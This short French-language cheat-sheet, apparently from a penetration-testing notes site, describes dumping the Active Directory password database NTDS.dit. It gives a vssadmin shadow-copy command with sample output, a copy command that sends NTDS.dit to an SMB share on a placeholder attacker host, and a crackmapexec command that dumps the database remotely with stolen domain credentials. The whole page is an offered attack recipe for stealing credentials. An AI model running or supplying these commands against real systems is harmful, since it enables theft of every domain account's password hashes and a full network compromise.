---
public: true # set to true to make the article publishable
---

## Localement

### Créer une Shadow Copy (cliché instantanné) du disque C

La base NTDS.dit est par défaut stockée dans `C:\Windows\NTDS`

```
vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copier à partir du cliché instantanné

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
```

## A distance

```
crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
```
